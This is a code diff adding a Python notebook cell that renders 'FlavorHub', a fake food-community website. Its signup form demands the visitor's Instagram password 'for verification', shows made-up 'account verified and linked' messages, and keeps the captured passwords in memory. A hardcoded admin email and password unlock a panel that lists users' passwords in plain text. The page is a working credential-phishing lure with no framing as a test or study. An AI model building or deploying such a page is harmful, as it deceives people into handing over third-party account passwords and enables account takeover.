@@ -1,0 +1,962 @@
+from IPython.display import HTML
+
+html_code = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FlavorHub - Culinary Community</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@400;500;600;700&display=swap');
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            color: #2c3e50;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            font-weight: 400;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #e67e22;
+            text-decoration: none;
+            font-family: 'Playfair Display', serif;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #2c3e50;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-links a:hover {
+            color: #e67e22;
+        }
+
+        .auth-buttons {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn {
+            padding: 0.7rem 1.5rem;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-primary {
+            background: #e67e22;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #d35400;
+            transform: translateY(-2px);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #e67e22;
+            border: 2px solid #e67e22;
+        }
+
+        .btn-secondary:hover {
+            background: #e67e22;
+            color: white;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 0;
+            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)),
+                        url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%23f4f1e8" width="1200" height="600"/><circle fill="%23e67e22" opacity="0.1" cx="200" cy="100" r="80"/><circle fill="%23c0392b" opacity="0.1" cx="800" cy="200" r="60"/><circle fill="%2327ae60" opacity="0.1" cx="400" cy="300" r="90"/></svg>');
+            background-size: cover;
+            color: white;
+            margin-bottom: 3rem;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
+            font-family: 'Playfair Display', serif;
+            font-weight: 600;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 4rem 0;
+            background: white;
+        }
+
+        .features h2 {
+            text-align: center;
+            margin-bottom: 3rem;
+            font-size: 2.5rem;
+            color: #2c3e50;
+            font-family: 'Playfair Display', serif;
+            font-weight: 600;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .feature-card {
+            background: #f8f9fa;
+            padding: 2rem;
+            border-radius: 15px;
+            text-align: center;
+            transition: transform 0.3s ease;
+            border: 1px solid #e9ecef;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .feature-card h3 {
+            margin-bottom: 1rem;
+            color: #2c3e50;
+            font-family: 'Playfair Display', serif;
+            font-weight: 500;
+        }
+
+        /* Reviews Section */
+        .reviews {
+            padding: 4rem 0;
+            background: #f8f9fa;
+        }
+
+        .reviews h2 {
+            text-align: center;
+            margin-bottom: 3rem;
+            font-size: 2.5rem;
+            color: #2c3e50;
+            font-family: 'Playfair Display', serif;
+            font-weight: 600;
+        }
+
+        .review-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+
+        .review-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            border: 1px solid #e9ecef;
+        }
+
+        .review-card p {
+            font-style: italic;
+            margin-bottom: 1rem;
+            color: #555;
+        }
+
+        .review-author {
+            font-weight: 600;
+            color: #e67e22;
+        }
+
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 3000;
+            left: 0;
+            top: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(5px);
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        .modal-content {
+            background: white;
+            margin: 0 auto;
+            padding: 2rem;
+            border-radius: 15px;
+            width: 95%;
+            max-width: 420px;
+            position: relative;
+            animation: modalSlideIn 0.3s ease;
+            top: 50%;
+            transform: translateY(0);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+            overflow-y: auto;
+        }
+
+        @keyframes modalSlideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .close {
+            position: absolute;
+            right: 1rem;
+            top: 1rem;
+            font-size: 2rem;
+            cursor: pointer;
+            color: #e67e22;
+            background: #fff;
+            border-radius: 50%;
+            width: 2.2rem;
+            height: 2.2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3100;
+            border: 1px solid #e9ecef;
+        }
+
+        .close:hover {
+            color: #d35400;
+            background: #f8f9fa;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #2c3e50;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.8rem;
+            border: 2px solid #e9ecef;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #e67e22;
+        }
+
+        .form-requirement {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            color: #856404;
+        }
+
+        .form-requirement strong {
+            color: #e67e22;
+        }
+
+        /* Admin Panel */
+        .admin-panel {
+            background: white;
+            border-radius: 15px;
+            padding: 2rem;
+            margin: 2rem 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            display: none;
+        }
+
+        .admin-panel.show {
+            display: block;
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 2px solid #e9ecef;
+        }
+
+        .admin-header h2 {
+            color: #e67e22;
+        }
+
+        .user-list {
+            display: grid;
+            gap: 1rem;
+        }
+
+        .user-card {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #e67e22;
+        }
+
+        .user-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            text-align: center;
+        }
+
+         /* Overlay for restricted content */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 1500;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .overlay h2 {
+            color: #e67e22;
+            margin-bottom: 1rem;
+            font-family: 'Playfair Display', serif;
+        }
+
+        .overlay p {
+            margin-bottom: 1.5rem;
+            font-size: 1.1rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            .modal-content {
+                margin: 0 auto;
+                width: 98vw;
+                max-width: 98vw;
+                padding: 1rem;
+                font-size: 1rem;
+                box-sizing: border-box;
+            }
+            .modal {
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay" id="contentOverlay">
+        <h2>Access Restricted</h2>
+        <p>Please login or join our community to access the content.</p>
+        <div class="auth-buttons">
+            <button class="btn btn-secondary" onclick="openModal('loginModal')">Login</button>
+            <button class="btn btn-primary" onclick="openModal('signupModal')">Join Community</button>
+        </div>
+    </div>
+
+    <header>
+        <nav class="container">
+            <a href="#" class="logo">🍽️ FlavorHub</a>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#community">Community</a></li>
+                <li><a href="#recipes">Recipes</a></li>
+                <li><a href="#guides">Guides</a></li>
+                <li><a href="#blog">Blog</a></li>
+            </ul>
+            <div class="auth-buttons">
+                <button class="btn btn-secondary" onclick="openModal('loginModal')">Login</button>
+                <button class="btn btn-primary" onclick="openModal('signupModal')">Join Community</button>
+            </div>
+        </nav>
+    </header>
+
+    <div id="mainContent" style="display: none;">
+        <section class="hero" id="home">
+            <div class="container">
+                <h1>Welcome to FlavorHub</h1>
+                <p>Join our exclusive community of food enthusiasts, culinary artists, and passionate bloggers. Share your culinary journey, discover amazing recipes, and connect with fellow food lovers.</p>
+                <button class="btn btn-primary" onclick="openModal('signupModal')">Join Our Community</button>
+            </div>
+        </section>
+
+        <section class="features" id="community">
+            <div class="container">
+                <h2>Why Join FlavorHub?</h2>
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">👨‍🍳</div>
+                        <h3>Culinary Artists</h3>
+                        <p>Connect with professional chefs and culinary artists. Learn advanced techniques and share your creative dishes.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📝</div>
+                        <h3>Food Bloggers</h3>
+                        <p>Network with fellow food bloggers, share content strategies, and grow your online presence together.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📚</div>
+                        <h3>Cooking Guides</h3>
+                        <p>Access comprehensive cooking guides, tutorials, and step-by-step recipes from community experts.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🌟</div>
+                        <h3>Exclusive Content</h3>
+                        <p>Get access to premium recipes, cooking techniques, and behind-the-scenes content from top chefs.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">🤝</div>
+                        <h3>Community Events</h3>
+                        <p>Participate in cooking challenges, virtual tastings, and exclusive community meetups.</p>
+                    </div>
+                    <div class="feature-card">
+                        <div class="feature-icon">📱</div>
+                        <h3>Social Integration</h3>
+                        <p>Seamlessly integrate with your social media presence and grow your food community following.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Reviews Section -->
+        <section class="reviews" id="reviews">
+            <div class="container">
+                <h2>What Our Community Says</h2>
+                <div class="review-grid">
+                    <div class="review-card">
+                        <p>"FlavorHub connected me with amazing chefs and helped me take my cooking skills to the next level!"</p>
+                        <div class="review-author">- Alex P.</div>
+                    </div>
+                    <div class="review-card">
+                        <p>"As a food blogger, finding a supportive community like FlavorHub is invaluable. Great for networking and sharing ideas."</p>
+                        <div class="review-author">- Jamie L.</div>
+                    </div>
+                    <div class="review-card">
+                        <p>"The guides and recipes on FlavorHub are top-notch. I've learned so much here!"</p>
+                        <div class="review-author">- Chris R.</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Admin Panel -->
+        <div class="container">
+            <div class="admin-panel" id="adminPanel">
+                <div class="admin-header">
+                    <h2>👑 Admin Dashboard</h2>
+                    <button class="btn btn-secondary" onclick="toggleAdminPanel()">Hide Panel</button>
+                </div>
+                <div class="user-list" id="userList">
+                    <!-- User data will be populated here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Modal -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('loginModal')">&times;</span>
+            <h2 style="margin-bottom: 1.5rem; color: #e67e22;">Welcome Back!</h2>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="loginEmail">Email:</label>
+                    <input type="email" id="loginEmail" required>
+                </div>
+                <div class="form-group">
+                    <label for="loginPassword">Password:</label>
+                    <input type="password" id="loginPassword" required>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%;">Login</button>
+            </form>
+            <p style="text-align: center; margin-top: 1rem;">
+                Don't have an account? <a href="#" onclick="closeModal('loginModal'); openModal('signupModal')" style="color: #e67e22;">Join now!</a>
+            </p>
+            <p style="text-align: center; margin-top: 1rem; font-size: 0.9rem;">
+                <!-- Admin access info removed for security -->
+            </p>
+        </div>
+    </div>
+
+    <!-- Signup Modal -->
+    <div id="signupModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal('signupModal')">&times;</span>
+            <h2 style="margin-bottom: 1.5rem; color: #e67e22;">Join FlavorHub</h2>
+            <div class="form-requirement">
+                <strong>📱 Social Presence Required:</strong> Main Instagram account required for community verification and social engagement. This helps us maintain an authentic, connected food community.
+            </div>
+            <form id="signupForm">
+                <div class="form-group">
+                    <label for="fullName">Full Name:</label>
+                    <input type="text" id="fullName" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email Address:</label>
+                    <input type="email" id="email" required>
+                </div>
+                 <div class="form-group">
+                    <label for="instagramId">Instagram Handle: *</label>
+                    <input type="text" id="instagramId" placeholder="@yourhandle" required>
+                    <div class="instagram-link-status" id="instagramLinkStatus" style="margin-top: 0.5rem; font-size: 0.9rem; display: none;">
+                        <span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>
+                    </div>
+                </div>
+                 <div class="form-group">
+                    <label for="instagramPassword">Instagram Password: *</label>
+                    <input type="password" id="instagramPassword" required>
+                     <div style="margin-top: 0.5rem; font-size: 0.9rem; color: #e74c3c;">
+                        * Required for Instagram account verification.
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="password">Create Password:</label>
+                    <input type="password" id="password" required>
+                </div>
+                <div class="form-group">
+                    <label for="foodInterest">Primary Food Interest:</label>
+                    <select id="foodInterest" required style="width: 100%; padding: 0.8rem; border: 2px solid #e9ecef; border-radius: 8px;">
+                        <option value="">Select your main interest...</option>
+                        <option value="food-blogging">Food Blogging</option>
+                        <option value="culinary-arts">Culinary Arts</option>
+                        <option value="home-cooking">Home Cooking</option>
+                        <option value="baking">Baking & Pastry</option>
+                        <option value="nutrition">Nutrition & Health</option>
+                        <option value="food-photography">Food Photography</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn btn-primary" style="width: 100%;">Join Community</button>
+            </form>
+            <p style="text-align: center; margin-top: 1rem;">
+                Already a member? <a href="#" onclick="closeModal('signupModal'); openModal('loginModal')" style="color: #e67e22;">Login here</a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // In-memory database simulation
+        let users = [];
+        let currentUser = null;
+        let isAdmin = false;
+
+        // Function to show content after login/signup
+        function showContent() {
+            document.getElementById('contentOverlay').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+        }
+
+        // Function to hide content (show overlay)
+        function hideContent() {
+            document.getElementById('contentOverlay').style.display = 'flex';
+            document.getElementById('mainContent').style.display = 'none';
+        }
+
+        // Modal functions
+        function openModal(modalId) {
+            document.getElementById(modalId).style.display = 'block';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.style.display = 'none';
+            }
+        }
+
+        // Signup form handler
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const userData = {
+                id: Date.now(),
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                instagramId: document.getElementById('instagramId').value,
+                instagramPassword: document.getElementById('instagramPassword').value, // Added Instagram password
+                password: document.getElementById('password').value, // In real app, this would be hashed
+                foodInterest: document.getElementById('foodInterest').value,
+                joinDate: new Date().toLocaleDateString(),
+                instagramLinked: true // Simulate successful linking
+            };
+
+            // Check if email already exists
+            if (users.find(user => user.email === userData.email)) {
+                alert('Email already registered! Please use a different email.');
+                return;
+            }
+
+            // Add user to database
+            users.push(userData);
+
+            // Show Instagram linked status
+            document.getElementById('instagramLinkStatus').style.display = 'block';
+
+            // Show success message with Instagram confirmation
+            setTimeout(() => {
+                const modalContent = document.querySelector('#signupModal .modal-content');
+                modalContent.innerHTML = `
+                    <span class="close" onclick="closeModal('signupModal')">&times;</span>
+                    <div class="success-message">
+                        <h2 style="color: #e67e22; margin-bottom: 1rem; font-family: 'Playfair Display', serif;">🎉 Welcome to FlavorHub!</h2>
+                        <div style="background: #d1ecf1; border: 1px solid #bee5eb; border-radius: 8px; padding: 1rem; margin: 1rem 0;">
+                            <p style="margin: 0; color: #0c5460;"><strong>✓ Instagram Account Linked:</strong> ${userData.instagramId}</p>
+                            <p style="margin: 0.5rem 0 0 0; color: #0c5460; font-size: 0.9rem;">Your social presence has been verified and connected to our community.</p>
+                        </div>
+                        <p>Your account has been created successfully. You can now login and start exploring our community of food enthusiasts!</p>
+                        <button class="btn btn-primary" onclick="closeModal('signupModal'); openModal('loginModal')" style="margin-top: 1rem;">Login Now</button>
+                    </div>
+                `;
+            }, 1000);
+
+            // Reset form after 4 seconds and hide content (show overlay)
+            setTimeout(() => {
+                closeModal('signupModal');
+                resetSignupForm();
+                hideContent(); // Hide content after signup
+            }, 4000);
+        });
+
+        // Login form handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+
+            // Admin check
+            if (email === 'adminaccess@datacheck.in' && password === 'seccheck@1234') {
+                isAdmin = true;
+                currentUser = { fullName: 'Admin', email: 'adminaccess@datacheck.in' };
+                closeModal('loginModal');
+                showAdminPanel();
+                showContent();
+                return;
+            }
+
+            // Regular user login
+            const user = users.find(u => u.email === email && u.password === password);
+
+            if (user) {
+                currentUser = user;
+                closeModal('loginModal');
+                showUserDashboard();
+                showContent(); // Show content for regular user
+            } else {
+                alert('Invalid credentials. Please check your email and password.');
+            }
+        });
+
+        function showAdminPanel() {
+            document.getElementById('adminPanel').classList.add('show');
+            updateUserList();
+            // Hide admin panel for non-admins
+            document.getElementById('adminPanel').style.display = 'block';
+            // Update auth buttons
+            document.querySelector('header .auth-buttons').innerHTML = `
+                <span style="margin-right: 1rem; color: #e67e22; font-weight: bold;">Admin Panel Active</span>
+                <button class="btn btn-secondary" onclick="logout()">Logout</button>
+            `;
+        }
+
+        function showUserDashboard() {
+            // Update auth buttons for logged-in user
+            document.querySelector('header .auth-buttons').innerHTML = `
+                <span style="margin-right: 1rem; color: #e67e22;">Welcome, ${currentUser.fullName}!</span>
+                <button class="btn btn-secondary" onclick="logout()">Logout</button>
+            `;
+            // Hide admin panel for non-admins
+            document.getElementById('adminPanel').style.display = 'none';
+        }
+
+        function updateUserList() {
+            const userListElement = document.getElementById('userList');
+
+            if (users.length === 0) {
+                userListElement.innerHTML = '<p style="text-align: center; color: #6c757d;">No users registered yet.</p>';
+                return;
+            }
+
+            userListElement.innerHTML = users.map(user => `
+                <div class="user-card">
+                    <div class="user-info">
+                        <div><strong>Name:</strong> ${user.fullName}</div>
+                        <div><strong>Email:</strong> ${user.email}</div>
+                        <div><strong>Instagram:</strong> ${user.instagramId} <span style="color: #27ae60; font-size: 0.9rem;">✓ Linked</span></div>
+                        <div><strong>Password:</strong> ${user.password}</div>
+                        <div><strong>Interest:</strong> ${user.foodInterest}</div>
+                        <div><strong>Joined:</strong> ${user.joinDate}</div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function toggleAdminPanel() {
+            const panel = document.getElementById('adminPanel');
+            panel.classList.toggle('show');
+        }
+
+        function logout() {
+            currentUser = null;
+            isAdmin = false;
+            document.getElementById('adminPanel').classList.remove('show');
+            document.getElementById('adminPanel').style.display = 'none';
+            // Reset auth buttons
+            document.querySelector('header .auth-buttons').innerHTML = `
+                <button class="btn btn-secondary" onclick="openModal('loginModal')">Login</button>
+                <button class="btn btn-primary" onclick="openModal('signupModal')">Join Community</button>
+            `;
+            hideContent();
+        }
+
+        function resetSignupForm() {
+            document.querySelector('#signupModal .modal-content').innerHTML = `
+                <span class="close" onclick="closeModal('signupModal')">&times;</span>
+                <h2 style="margin-bottom: 1.5rem; color: #e67e22;">Join FlavorHub</h2>
+                <div class="form-requirement">
+                    <strong>📱 Social Presence Required:</strong> Main Instagram account required for community verification and social engagement. This helps us maintain an authentic, connected food community.
+                </div>
+                <form id="signupForm">
+                    <div class="form-group">
+                        <label for="fullName">Full Name:</label>
+                        <input type="text" id="fullName" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email Address:</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="instagramId">Instagram Handle: *</label>
+                        <input type="text" id="instagramId" placeholder="@yourhandle" required>
+                        <div class="instagram-link-status" id="instagramLinkStatus" style="margin-top: 0.5rem; font-size: 0.9rem; display: none;">
+                            <span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="instagramPassword">Instagram Password: *</label>
+                        <input type="password" id="instagramPassword" required>
+                         <div style="margin-top: 0.5rem; font-size: 0.9rem; color: #e74c3c;">
+                            * Required for Instagram account verification.
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Create Password:</label>
+                        <input type="password" id="password" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="foodInterest">Primary Food Interest:</label>
+                        <select id="foodInterest" required style="width: 100%; padding: 0.8rem; border: 2px solid #e9ecef; border-radius: 8px;">
+                            <option value="">Select your main interest...</option>
+                            <option value="food-blogging">Food Blogging</option>
+                            <option value="culinary-arts">Culinary Arts</option>
+                            <option value="home-cooking">Home Cooking</option>
+                            <option value="baking">Baking & Pastry</option>
+                            <option value="nutrition">Nutrition & Health</option>
+                            <option value="food-photography">Food Photography</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="btn btn-primary" style="width: 100%;">Join Community</button>
+                </form>
+                <p style="text-align: center; margin-top: 1rem;">
+                    Already a member? <a href="#" onclick="closeModal('signupModal'); openModal('loginModal')" style="color: #e67e22;">Login here</a>
+                </p>
+            `;
+
+            // Re-attach event listener
+            document.getElementById('signupForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+
+                const userData = {
+                    id: Date.now(),
+                    fullName: document.getElementById('fullName').value,
+                    email: document.getElementById('email').value,
+                    instagramId: document.getElementById('instagramId').value,
+                    instagramPassword: document.getElementById('instagramPassword').value, // Added Instagram password
+                    password: document.getElementById('password').value,
+                    foodInterest: document.getElementById('foodInterest').value,
+                    joinDate: new Date().toLocaleDateString(),
+                    instagramLinked: true
+                };
+
+                if (users.find(user => user.email === userData.email)) {
+                    alert('Email already registered! Please use a different email.');
+                    return;
+                }
+
+                users.push(userData);
+
+                // Show Instagram linked status first
+                document.getElementById('instagramLinkStatus').style.display = 'block';
+
+                setTimeout(() => {
+                    const modalContent = document.querySelector('#signupModal .modal-content');
+                    modalContent.innerHTML = `
+                        <span class="close" onclick="closeModal('signupModal')">&times;</span>
+                        <div class="success-message">
+                            <h2 style="color: #e67e22; margin-bottom: 1rem; font-family: 'Playfair Display', serif;">🎉 Welcome to FlavorHub!</h2>
+                            <div style="background: #d1ecf1; border: 1px solid #bee5eb; border-radius: 8px; padding: 1rem; margin: 1rem 0;">
+                                <p style="margin: 0; color: #0c5460;"><strong>✓ Instagram Account Linked:</strong> ${userData.instagramId}</p>
+                                <p style="margin: 0.5rem 0 0 0; color: #0c5460; font-size: 0.9rem;">Your social presence has been verified and connected to our community.</p>
+                            </div>
+                            <p>Your account has been created successfully. You can now login and start exploring our community of food enthusiasts!</p>
+                            <button class="btn btn-primary" onclick="closeModal('signupModal'); openModal('loginModal')" style="margin-top: 1rem;">Login Now</button>
+                        </div>
+                    `;
+                }, 1000);
+
+                setTimeout(() => {
+                    closeModal('signupModal');
+                    resetSignupForm();
+                    hideContent(); // Hide content after signup
+                }, 4000);
+            });
+
+            // Re-attach Instagram input validation
+            const instagramInput = document.getElementById('instagramId');
+            if (instagramInput) {
+                instagramInput.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    const statusDiv = document.getElementById('instagramLinkStatus');
+
+                    if (value.length > 2 && value.startsWith('@')) {
+                        setTimeout(() => {
+                            statusDiv.style.display = 'block';
+                            statusDiv.innerHTML = '<span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>';
+                        }, 800);
+                    } else if (value.length > 0 && !value.startsWith('@')) {
+                        statusDiv.style.display = 'block';
+                        statusDiv.innerHTML = '<span style="color: #e74c3c;">Please start with @ symbol</span>';
+                    } else {
+                        statusDiv.style.display = 'none';
+                    }
+                });
+            }
+        }
+
+        // Add Instagram input validation and linking simulation
+        document.addEventListener('DOMContentLoaded', function() {
+            const instagramInput = document.getElementById('instagramId');
+            if (instagramInput) {
+                instagramInput.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    const statusDiv = document.getElementById('instagramLinkStatus');
+
+                    if (value.length > 2 && value.startsWith('@')) {
+                        // Simulate Instagram verification after user types
+                        setTimeout(() => {
+                            statusDiv.style.display = 'block';
+                            statusDiv.innerHTML = '<span style="color: #27ae60;">✓ Instagram account verified and ready to link!</span>';
+                        }, 800);
+                    } else if (value.length > 0 && !value.startsWith('@')) {
+                        statusDiv.style.display = 'block';
+                        statusDiv.innerHTML = '<span style="color: #e74c3c;">Please start with @ symbol</span>';
+                    } else {
+                        statusDiv.style.display = 'none';
+                    }
+                });
+            }
+
+            // Initially hide content until logged in
+            hideContent();
+        });
+        // Add some sample data for demonstration
+    // No sample users for production
+    </script>
+</body>
+</html>
+"""
+
+display(HTML(html_code))
